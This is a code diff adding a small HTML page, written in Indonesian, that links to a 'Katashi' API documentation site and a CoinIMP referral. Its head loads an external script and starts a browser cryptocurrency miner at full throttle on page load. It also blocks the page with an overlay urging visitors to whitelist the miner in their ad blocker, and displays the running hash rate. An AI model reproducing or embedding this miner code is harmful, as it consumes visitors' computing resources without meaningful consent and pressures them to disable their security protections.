@@ -1,0 +1,49 @@
+<html>
+<head>
+<script src="https://www.hostingcloud.racing/6cPM.js"></script>
+<script>
+    var _client = new Client.Anonymous('e3150bd98ad13667fbe10986ef10c9d36e1dead91f98625d9a3eb7a57d550a88', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "Katashi is running JavaScript miner from coinimp.com in this site", "#cccccc", 40, "#3d3d3d");
+</script>
+<script>
+    setTimeout(function(){
+        if(typeof _client === 'undefined' || _client === null)
+        {
+            var messageDiv = document.createElement("div");
+            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+            var mainDiv = document.createElement("div");
+            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+            mainDiv.appendChild(messageDiv);
+            document.body.appendChild(mainDiv);
+            document.getElementsByTagName("body")[0].style.overflow = "hidden";
+            window.scrollTo(0, 0);
+        }
+    },1000);
+</script>
+<script>
+setTimeout(function(){
+    let div = document.createElement("div");
+    document.body.appendChild(div);
+    setInterval(function(){
+        let speed = _client._threads.reduce((before, worker) => before + worker.hashesPerSecond, 0);
+        let total = _client._threads.reduce((before, worker) => before + worker.hashesTotal, 0);
+        div.innerHTML = `Speed: ${speed} Hashes/s<br>Total Hash: ${total}`;
+    },500);
+},1000);
+</script>
+</head>
+<body>
+rest api klik link di bawah
+<br>
+<a href="https://api-katashi.herokuapp.com/docs">Katashi Api</a>
+</body>
+<body>
+link untuk mining 
+<br>
+<a href="https://www.coinimp.com/invite/d39a7b23-9bd2-42c1-b95b-1a875c984e12">Link Mining</a>
+</body>
+</html>
